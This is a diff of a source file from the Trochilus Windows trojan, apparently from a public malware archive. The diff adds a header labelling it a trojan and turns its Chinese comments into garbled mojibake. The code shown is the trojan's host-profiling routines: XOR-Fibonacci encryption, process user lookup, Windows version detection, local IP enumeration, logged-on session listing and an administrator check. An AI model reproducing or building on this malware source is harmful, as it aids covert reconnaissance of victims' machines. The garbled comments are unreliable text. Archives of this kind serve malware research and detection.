@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <Iphlpapi.h>
 #include <Winsock2.h>
@@ -28,7 +39,7 @@ void XorFibonacciCrypt(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypte
 	}
 }
 
-//»ñÈ¡½ø³ÌÓÃ»§º¯Êý£º 
+//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 
 LPCTSTR GetProcessUserName(DWORD dwID)
 { 
 	HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,dwID); 
@@ -115,8 +126,8 @@ WIN_VER_DETAIL GetWindowsVersion()
 	OSVERSIONINFOEX osvi = {0};
 	BOOL bOsVersionInfoEx;
 
-	//ÏÈ³¢ÊÔGetVersionExÊ¹ÓÃOSVERSIONINFOEX½á¹¹
-	//Èç¹ûÊ§°Ü£¬¾Í³¢ÊÔÊ¹ÓÃOSVERSIONINFO½á¹¹
+	//ï¿½È³ï¿½ï¿½ï¿½GetVersionExÊ¹ï¿½ï¿½OSVERSIONINFOEXï¿½á¹¹
+	//ï¿½ï¿½ï¿½Ê§ï¿½Ü£ï¿½ï¿½Í³ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½OSVERSIONINFOï¿½á¹¹
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
 	if(! (bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*) &osvi)))
 	{
@@ -134,9 +145,9 @@ WIN_VER_DETAIL GetWindowsVersion()
 
 	switch (osvi.dwPlatformId)
 	{
-		//²âÊÔÊÇ·ñÊÇ Windows NT ²úÆ·¼Ò×å
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ Windows NT ï¿½ï¿½Æ·ï¿½ï¿½ï¿½ï¿½
 	case VER_PLATFORM_WIN32_NT:
-		//¼à²â¾ßÌåµÄ²úÆ·
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä²ï¿½Æ·
 		if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
 		{
 			if(osvi.wProductType == VER_NT_WORKSTATION)
@@ -202,7 +213,7 @@ WIN_VER_DETAIL GetWindowsVersion()
 		}
 		break;
 
-		//²âÊÔÊÇ·ñÊÇWindows Me/98/95.
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½Windows Me/98/95.
 	case VER_PLATFORM_WIN32_WINDOWS:
 		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
 		{
@@ -265,7 +276,7 @@ BOOL GetLocalIPList(TStringVector& localIPList)
 {
 	localIPList.clear();
 
-	//»ñÈ¡ipÁÐ±í
+	//ï¿½ï¿½È¡ipï¿½Ð±ï¿½
 	DWORD dwBytes = 0;
 	::GetIpAddrTable(NULL, &dwBytes, TRUE);
 
@@ -281,7 +292,7 @@ BOOL GetLocalIPList(TStringVector& localIPList)
 	{
 		MIB_IPADDRROW& row = pTable->table[i];
 
-		//Èç¹û¸ÃµØÖ·ÔÚ¶Ï¿ªÁ¬½ÓµÄÍø¿¨ÉÏ,»òÕßÕýÔÚ±»É¾³ý,Ôò²»Óè´¦Àí
+		//ï¿½ï¿½ï¿½ï¿½Ãµï¿½Ö·ï¿½Ú¶Ï¿ï¿½ï¿½ï¿½ï¿½Óµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú±ï¿½É¾ï¿½ï¿½,ï¿½ï¿½ï¿½è´¦ï¿½ï¿½
 		if ((row.wType & MIB_IPADDR_DISCONNECTED) || (row.wType & MIB_IPADDR_DELETED))
 		{
 			continue;
@@ -291,7 +302,7 @@ BOOL GetLocalIPList(TStringVector& localIPList)
 		addr.S_un.S_addr = row.dwAddr;
 		std::string curlocalip(inet_ntoa(addr));
 
-		//ºöÂÔÒ»Ð©ÎÞÐ§µØÖ·
+		//ï¿½ï¿½ï¿½ï¿½Ò»Ð©ï¿½ï¿½Ð§ï¿½ï¿½Ö·
 		if (curlocalip == "127.0.0.1"
 			|| curlocalip.find("169.254") == 0) 
 		{
@@ -392,7 +403,7 @@ BOOL GetLogonUserList( SessionInfoList& sessionList )
 	{
 		if(pSessionInfo[i].SessionId == 65536) continue;
 
-		//²éÑ¯ÓÃ»§Ãû
+		//ï¿½ï¿½Ñ¯ï¿½Ã»ï¿½ï¿½ï¿½
 		tstring username;
 		LPTSTR pBuffer = NULL;
 		DWORD dwBufferLen = 0;
@@ -425,7 +436,7 @@ BOOL IsAdministrator()
 	UINT16 uWinVer = LOWORD(GetVersion());
 	uWinVer = MAKEWORD(HIBYTE(uWinVer),LOBYTE(uWinVer));
 
-	if (uWinVer < 0x0600)//²»ÊÇVISTA¡¢Windows7
+	if (uWinVer < 0x0600)//ï¿½ï¿½ï¿½ï¿½VISTAï¿½ï¿½Windows7
 		return TRUE;
 
 	if (OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken)) {
